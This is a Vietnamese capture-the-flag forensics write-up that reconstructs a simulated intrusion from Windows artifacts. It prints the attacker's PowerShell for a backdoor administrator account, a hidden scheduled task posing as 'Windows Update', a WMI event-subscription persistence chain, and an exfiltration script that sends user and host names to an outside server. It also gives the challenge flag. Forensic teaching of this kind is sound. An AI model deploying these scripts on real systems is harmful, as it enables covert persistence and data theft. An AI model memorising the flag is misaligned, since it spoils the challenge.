# Concealed Surveilance 

<img width="555" height="841" alt="Screenshot 2026-04-19 012548" src="https://github.com/user-attachments/assets/31d373b7-0ee3-4f0d-8433-787524b6c377" />

**Link challenge**: https://jctf-vi-lfs-participant.s3.us-east-1.amazonaws.com/concealed-surveillance.zip

**Description**: Recently, rumors have arisen that Tony Wonder had access to Cold War secrets regarding confidential governmental contracts with IBM. They have been targeting Tony for some time, and it's our job to identify the espionage. Given this logical file containing parts of his system, can you?

Identify more information about the secondary user on the machine.

Identify the mediums of persistence that Soviets agents have. there is four information fragments that need to be identified!

Flow của challenge này thì khá dễ, và các fragment của flag sau khi author đã chỉnh sửa lại file đề thì cũng đã dễ thấy hơn rất nhiều, nên trong challenge này mình sẽ đi sâu hơn vào các kỹ thuật persistence của attacker, và chain attack của attacker trong bài hơn. Nhưng mình sẽ dựa vào các artifact có trong disk image của hệ thống để tái tạo lại timeline để hình thành 1 chain attack của attacker:

Mình dựa vào registry key `RecentDocs` - chứa các file được truy cập trong hệ thống và số lần truy cập và các file `lnk` - là các file shortcut trỏ đến file gốc trong hệ thống, nếu một người dùng truy cập vào 1 file đó nhiều lần thì nó sẽ tạo ra file `lnk` để tiện trong việc truy cập nhanh, khi đó nó tạo thành 1 artifact lớn trong bài.

<img width="1835" height="695" alt="image" src="https://github.com/user-attachments/assets/c35e9a5a-3b79-4e5c-a238-18f9f1fa1c8c" />

<img width="921" height="457" alt="image" src="https://github.com/user-attachments/assets/b524ba80-e5b3-44d7-abfb-010e331d735e" />

Mình sử dụng công cụ `LECMd` để thực hiện trích xuất các metadata từ file `lnk` và check file `Microsoft Windows Powershelll Operational.evtx` để dựng lại timeline trong bài này:

```
test.ps1 last access: 2026-03-06 16:55:20 -- foothold trong hệ thống (file lnk)

windows schedule task execution: 2026-03-06 17:35:01 (powershell log)

telemetry.ps1 last access 2026-03-06 19:15:04 (file lnk)

wmi execution __eventfilter: 2026-03-06 19:39:25 (powershell log)

```

Giờ mình sẽ đi sâu vào từng event trong bài này:

Đầu tiên, khi mình check qua các thư mục của users `Tony Wonder` thì mình sẽ thấy được bên trong folder Documents sẽ chứa 1 script tên là `test.ps1` và nội dung của script này thực hiện hành động `foothold` và `backdoor` như sauL:

```powershell
$username = "commodore64"
$password = ConvertTo-SecureString "pass" -AsPlainText -Force
$user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue

if (-not $user) {
    New-LocalUser -Name $username -Password $password -Description "amN0Znt0aDNfY29tbW9kMHIzcw" -AccountNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $username
}
```

> Attacker tạo 1 users local với tên là `commondore64` và đặc 1 password cho users đó qua 2 biến môi trường `$username & $password`.
>
> Điểm đặc biệt khi attacker này đặt mật khẩu chính là hắn sử dụng `ConvertTo-SecureString` - đây là 1 kĩ thuật nhỏ trong challenge, để attacker thực hiện tránh lộ mật khẩu của mình khi có người đụng vào biến môi trường password. Và mình sẽ giả sử nếu có người check vào biến `$password` nó sẽ sinh ra gì:
>
> Sau đó attacker sử dụng biến `$user` để check xem có user nào tên là `commondore64` trong hệ thống khong, kèm theo arguments `ErrorAction SilentlyContinue` để tránh hiện ra lỗi khi check xem có user đó khong.
>
> Cuối cùng là nếu khong có user (`if (-not $user) `), thì tạo user `commondore64` gán password đã covert thành securestring và gán nó vào quyền **Administrator**.
```powershell
PS C:\Users\LOQ\tools\Eric-Zic_tools\LECmd> "Password" | ConvertTo-SecureString -AsPlainText -Force
System.Security.SecureString
PS C:\Users\LOQ\tools\Eric-Zic_tools\LECmd> "Password" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000c1556debd05ce54c8615297f31acaeba00000000020000000000106600000001000020000000fdb3ae124badba9f73e7042faaf796573868422673d5688ffcad83853479080c000000000e80000000020000200000000678cbd27fe1678904c7470ca6476d56ab7d86346fcd64b882a20c8dff21de4a20000000b0a27187b66326b684c3d49c3172b096db760731a01dad9d8ecfea7f3d3e66124000000050b52ce0b89856af76d50ebb7c6bea80f61882d28130d4afcd9873428b673b53046be8d2b8e4f89d0b9652653d900be1403f6066794efd015c91ea09fe0919c3
```
> Đây là 1 ví dụ nhỏ của kỹ thuật này, khi lưu vào biến môi trường, họ hoàn toàn k biết được plaintext gốc của mật khẩu user `commondore64` là gì.

Target của script này là thực hiện tạo 1 account users cục bộ tên là `commondore64`, mang permission administrator để thực hiện sau này dăng nhập vào hệ thống sẽ dễ hơn thay vì phải reverse shell hoặc là 1 kỹ thuật khác. Kỹ thuật **persistence by account** - **Create Account** với Mitre ID là `T1136`.

> Kẻ tấn công thực hiện tạo 1 tài khoản để duy trì truy cập trên hệ thống của nạn nhân. Với mức độ truy cập không nhiều, việc sử dụng kỹ thuật tạo 1 users mới trong hệ thống để thực hiện backdoor sẽ dễ dàng hơn việc sử dụng các công cụ để có quyền truy cập hệ thống từ xa (remote access access - RCE).


Tiếp theo attacker thực hiện tạo nên 1 tác vụ schedule task, để thực hiện run script `script.ps1` mỗi khi user logon vào hệ thống, và attacker cũng thực hiện đổi tên task đó thành Windows Update để giả dạng nó thành 1 tác vụ hợp lệ trong system.

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\script.ps1"
Set-ScheduledTask -TaskName "Windows Update" -Action $action
Get-ScheduledTask -TaskName "Windows Update"
Get-ScheduledTask -TaskName "Windows Update" | Select-Object *
```

Mình lấy script này bên trong phần console history của folder `PSreadline` của Powershell, trong này attacker thực hiện tạo 1 task với hành động execute script powershell `powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\script.ps1`, và thực hiện đặt tên nó là `Windows Update`. Khi đó mình thực hiện vào folder `Tasks` nằm trong `C:\Windows\System32\Task` sẽ thấy được 1 file task tên là Windows Update ở đây, thực hiện export ra để thấy thêm thông tin bên trong:

<img width="2465" height="649" alt="image" src="https://github.com/user-attachments/assets/2d9c1157-46d8-4803-b0f2-2f6a2acae3af" />

<summary> Windows Update
  <details>
    <?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-03-06T09:08:57.5353249</Date>
    <Author>APOLLO-XIIV\commodore64</Author>
    <Description>Critical Windows Designation Process: X2hAdmVfaW5mMWw</Description>
    <URI>\Windows Update</URI>
    <SecurityDescriptor />
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-1853761092-1564869425-2005654723-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1H</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\script.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
  </details>
</summary>

Qua phần nội dung rõ hơn bên trong file `Windows Update` chúng ta có thể nhìn nhận được rõ hơn là task này sẽ thực hiện ngay sau khi hệ thống boot được 5min, qua thẻ <trigger> 
```xml
 <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
```
Đây là kĩ thuật persistence thông qua schedule task, kẻ tấn công sẽ thực hiện chạy 1 hàm với chức năng thực hiện execution malicios code. Các tiện ích bên trong toàn bộ hệ điều hành, đều đặt 1 schedule task với ngày giờ thực hiện một tác vụ hoặc chạy 1 chương trình nào đó trong hệ thống. Đây là kĩ thuật persistence khá phổ thông với MITRE ID: **T1053**. 

Sau khi thực hiện persistence bằng schedule task, thì attacker thực hiện drop payload vào hệ thống để thực hiện exfil data, từ malicious code này, và script được attacker drop xuống hệ thống là file `telemetry.ps1`, và để lấy được nội dung file thì mình follow theo path `C:\ProgramData\telemetry.ps1` - lấy được trong metadata của file `lnk`:

<img width="1522" height="282" alt="image" src="https://github.com/user-attachments/assets/77141118-832a-4427-8237-8f0e4df62d65" />


```powershell
$u = $env:USERNAME
$c = $env:COMPUTERNAME
$t = Get-Date -Format o

$uri = "http://telemetry.apollo-xiiv.local/dHJAdGVkXyFudDA=/$c/$u/$t"

Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET | Out-Null

```

> Đây là 1 script thực hiện exfil các thông tin hệ thống, giờ mình sẽ đi sâu vào cách script hoạt động:
> - Đầu tiên là tạo các biến môi trường `$u`, `$c`, `t` lần lượt là chứa tên của username, computername và time hiện tại đang chạy tiến trình powershell.
> - Sau đó tạo 1 dường dẫn url, với format `http://telemetry.apollo-xiiv.local/<fragment>/<computername>/<username>/<timestamp>` và cho nó vào envars `uri`.
> - Dùng lệnh `Invoke_WebReuqest` gọi cmdlet để thực hiện tương tác với server web, gửi đến server web một request `GET` để exfil data, bên trong url.

Cuối cùng là kĩ thuật persistence **WMi event subscription** được sử dụng để chạy script exfiltration kia, nhưng trước khi đi vào kỹ thuật persistence WMI, thì mình sẽ đi qua, WMI là gì trước:

WMI là cách quản lý hệ thống doanh nghiệp dựa trên web (WBEM) của Microsoft. Nó cung cấp 1 bộ công cụ cho phép administrator có thể quản lý hệ thống Windows từ xa. Và WMi cũng đã được cài đặt mặc định trên hệ thống Windows OS. Đây cũng là 1 trong những persistence phổ thông thường gặp khi malware muốn thực hiện persistence trong hệ thống.

Đặc biệt là các tính năng của **WMI event subcription**, được sử dụng nhiều nhất bởi malware để đạt được persistence. Một số khái niệm như:
- `WMI class` được dùng để truyền dữ liệu đế dịch vụ WMI, bởi các nhà cung cấp dịch vụ WMI. Mỗi lớp sẽ có các sự kiện (events) và thuộc tính `property` để thu thập và thiết lập dữ liệu thực tế.

- `WMI event subscription`: kích hoạt hành vi một cách tự động khi sự kiện được quy định xảy ra, nó sử dụng 3 lớp để thực hiện hành vi auto execute của mình:
  - `__EventFilter`: Quy định về điều kiện để có thể kích hoạt `__EventConsumer`.
  - `__EventConsumer`: Hành vi thực hiện nếu điều kiện `eventfilter` thỏa.
  - `FilterToConsumerBinding`: Cầu nối giữa Event filter và event consumer. 

Khi tạo một **WMI event subscription** thì sẽ tạo ra 1 object được lưu trong WMI repository. WMI repository là 1 một cơ sở dữ liệu chứa thông tin về các class của WMi, được lưu tại `%SystemRoot%\System32\Wbem\Reporsitory`, nó gồm các file:
- `OBJECTS.DATA:` Những object mà WMI quản lý.
- `INDEX.BTR`: Mục lục các file được import và `objects.data`
- `MAPPING[1-3].MAP`: thông tin chỉ mục cho phép WMI navigate được các dữ liệu trong OBJECTS.DATA nhanh hơn.

Bởi vì khi mình check các file trong registry key `RecentDocs` thì thấy được file `OBJECTS.DATA` được truy cập vào khá nhiều, nên mình thực hiện lọc ra các dữ liệu bên trong file này, để tìm script thực hiện kỹ thuật persistence trên:

```powershell
$filterArgs = @{`
Name = "WindowsTelemetryFilter"`
EventNamespace = "root\cimv2"`
QueryLanguage = "WQL"`
Query = "SELECT*FROM Win32_LogonSession"`
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
$consumerArgs = @{`
Name = "WindowsTelemetryConsumer"`
CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\telemetry.ps1"`
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
$bindArgs = @{`
Filter = $filter`
Consumer =$consumer`
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs
Get-WmiObject -Namespace root\subscription -Class __EventFilter`
```

Giải thích qua về toàn bộ script thực hiện persistence wmi trên:

```powershell
$filterArgs = @{
Name = "WindowsTelemetryFilter"
EventNamespace = "root\cimv2"
QueryLanguage = "WQL"
Query = "SELECT*FROM Win32_LogonSession"
}
```

- Đầu tiên attacker khởi tạo 1 biến `$filterargs` chứa tên filter điều kiện trong biến `name: WindowsTelemetryFilter`, khai báo `namespace "root\cimv2"` - để quản lý các class và objects.
```
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```
- Sau đó attacker bắt đầu tạo các objects - đầu tiên là objects loại `__EventFilter` sử dụng tham số `arguments $filterargs` để chứa các điều kiện mong muốn bên trong ở đây sẽ là:
  - `name`: WindowsTelemetryFilter.
  - `EventNamespace`: root\cimv2.

```powershell
$consumerArgs = @{
Name = "WindowsTelemetryConsumer"
CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\telemetry.ps1"
}
```
- Tiếp tục attacker bắt đầu tạo biến `$consumerArgs` chứa `name WindowsTelemetryConsumer` tức là khai báo đây là objects loại consumer, và dùng consumer loại `CommandLineTemplates` để thực hiện chỉ định execution một script powershell chạy file exfil data khi nãy mình có nói.

```powershell
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
```
- Bên dưới thực hiện khai báo objects consumer và đưa các tham số ở trên vào, và chọn loại `CommandLineEventConsumer` để có thể chạy script.

```powershell
$bindArgs = @{
Filter = $filter
Consumer =$consumer
}
```
- Cuối cùng là khai báo hashtable nó lấy objects filter và consumer nối chúng lại, và thực hiện tạo objects `__FilterToConsumerBinding` để hoàn thành persistence.
`Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs`

Để kiểm tra được lệnh này trong hệ thống, chúng ta cũng vào event logs file `Microsoft Windows Powershell Operaional` để check log vì nó có gọi tiến trình powershell nên sẽ được ghi lại vào đây:

<img width="1151" height="647" alt="image" src="https://github.com/user-attachments/assets/f1121528-343d-4315-a1e7-c7f2bda76ef2" />

Đây cũng là bước cuối mà attacker thực hiện trong hệ thống để hoàn thành chain attack: compromissed -> foothold/backdoor -> execute task chạy `script.ps1` -> drop payload (file `telemetry.ps1` thực hiện exfiltration data qua url) -> persistence qua kĩ thuật WMI event subscription.

Qua mỗi giai đoạn sẽ gom được 1 payload base64 theo timeline trên luôn:

```
test.ps1 last access: 2026-03-06 16:55:20 -- foothold trong hệ thống (file lnk) - amN0Znt0aDNfY29tbW9kMHIzc -> jctf{th3_commod0r3

windows schedule task execution: 2026-03-06 17:35:01 (powershell log) - X2hAdmVfaW5mMWw -> _h@ve_inf1l

telemetry.ps1 last access 2026-03-06 19:15:04 (file lnk) - dHJAdGVkXyFudDA= -> tr@ted_!nt0

wmi execution __eventfilter: 2026-03-06 19:39:25 (powershell log) - X3RoM19hcG9sbDAhfQ== -> _th3_apoll0!}
```

**flag: jctf{th3_commod0r3_h@ve_inf1l_tr@ted_!nt0_th3_apoll0!}**
